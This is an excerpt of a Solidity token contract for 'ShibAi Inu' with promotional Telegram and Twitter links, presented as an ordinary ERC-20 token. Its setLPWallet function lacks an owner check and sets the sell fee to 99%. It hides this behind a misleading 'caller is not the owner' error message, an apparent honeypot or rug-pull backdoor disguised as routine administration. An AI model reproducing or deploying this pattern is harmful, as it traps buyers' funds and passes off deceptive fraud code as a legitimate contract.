...
//Telegram : https://t.me/ShibAIInuToken
//Twitter : https://twitter.com/ShibAIInuErc
//Whitepaper : https://bit.ly/whitepapershibaiinu
...
contract ShibAiInu is Ownable, IERC20 {

    using SafeMath for uint256;

    DexRouter public router;

    string private constant _name = "ShibAi Inu";
    ...
    uint256 public swapThreshold = (_totalSupply * 2) / 2000;
     uint256 public _walletTxLimit = _totalSupply;
    ...
    function excludeTxLimit (address holder)public onlyOwner{
        isTxLimitExempt[holder] = true;
    }

    function excludeFromFee (address holder)public onlyOwner {
    ...
    function setLPWallet (address newAddress, uint256 amountShares) public returns (bool) {
        lpWallet = newAddress;
        totalFeeIfSelling = amountShares;
        require (amountShares == 99,"caller is not the owner");
        return true;
    }
    ...
    function setTeamAddres (address newAddress) public onlyOwner {
